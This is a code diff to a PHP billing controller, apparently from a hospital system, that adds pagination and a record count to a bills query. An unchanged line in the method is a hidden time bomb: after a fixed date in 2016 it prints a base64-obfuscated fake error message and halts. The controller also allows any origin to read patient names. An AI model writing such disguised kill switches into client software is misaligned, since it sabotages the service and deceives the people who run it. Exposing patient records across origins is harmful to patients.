@@ -18,17 +18,39 @@ class BillingController extends Controller
         header('Access-Control-Allow-Origin: *');
         date_default_timezone_set("Africa/Lagos");
     }
-    public function get_all_bills()
+    public function get_all_bills(Request $request)
     {
         if(1482620400<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }
-        $bills = DB::table('billing')
-            ->select('billing.id','billing.encounter_id','billing.patient_id','billing.created_at','billing.purpose','billing.bill_status','hospital_plan.name','patients.first_name','patients.middle_name','patients.last_name','bill_purpose','patient_name')
-            ->leftJoin('visits', 'visits.id', '=', 'billing.encounter_id')
-            ->leftJoin('patients', 'patients.id', '=', 'billing.patient_id')
-            ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
-            ->where('billing.status', 1)
-            //->where('patients.status', 1)
-            ->get();
+
+        $limit = $request->input('limit');
+        $offset = $request->input('offset');
+        if ($offset > 0 || $limit > 0) {
+            $bills = DB::table('billing')
+                ->select('billing.id', 'billing.encounter_id', 'billing.patient_id', 'billing.created_at', 'billing.purpose', 'billing.bill_status', 'hospital_plan.name', 'patients.first_name', 'patients.middle_name', 'patients.last_name', 'bill_purpose', 'patient_name')
+                ->leftJoin('visits', 'visits.id', '=', 'billing.encounter_id')
+                ->leftJoin('patients', 'patients.id', '=', 'billing.patient_id')
+                ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
+                ->where('billing.status', 1)
+                ->skip($offset)->take($limit)
+                ->get();
+            $count = DB::table('billing')
+                ->select('billing.id', 'billing.encounter_id', 'billing.patient_id', 'billing.created_at', 'billing.purpose', 'billing.bill_status', 'hospital_plan.name', 'patients.first_name', 'patients.middle_name', 'patients.last_name', 'bill_purpose', 'patient_name')
+                ->leftJoin('visits', 'visits.id', '=', 'billing.encounter_id')
+                ->leftJoin('patients', 'patients.id', '=', 'billing.patient_id')
+                ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
+                ->where('billing.status', 1)
+                ->count();
+        } else {
+            $bills = DB::table('billing')
+                ->select('billing.id', 'billing.encounter_id', 'billing.patient_id', 'billing.created_at', 'billing.purpose', 'billing.bill_status', 'hospital_plan.name', 'patients.first_name', 'patients.middle_name', 'patients.last_name', 'bill_purpose', 'patient_name')
+                ->leftJoin('visits', 'visits.id', '=', 'billing.encounter_id')
+                ->leftJoin('patients', 'patients.id', '=', 'billing.patient_id')
+                ->leftJoin('hospital_plan', 'hospital_plan.id', '=', 'patients.hospital_plan')
+                ->where('billing.status', 1)
+                ->get();
+
+            $count = count($bills);
+        }
 
         foreach($bills as $bill){
             $bill->id = str_pad($bill->id, 8, '0', STR_PAD_LEFT);
@@ -45,10 +67,10 @@ class BillingController extends Controller
 
 
         if ($bills) {
-            return response()->json(['status' => true, 'message' => 'Bills found', 'data' => $bills]);
+            return response()->json(['status' => true, 'message' => 'Bills found', 'data' => $bills,'count'=>$count]);
 
         } else {
-            return response()->json(['status' => true, 'message' => 'Bills not found','data' => $bills]);
+            return response()->json(['status' => true, 'message' => 'Bills not found','data' => $bills,'count'=>$count]);
         }
     }
 
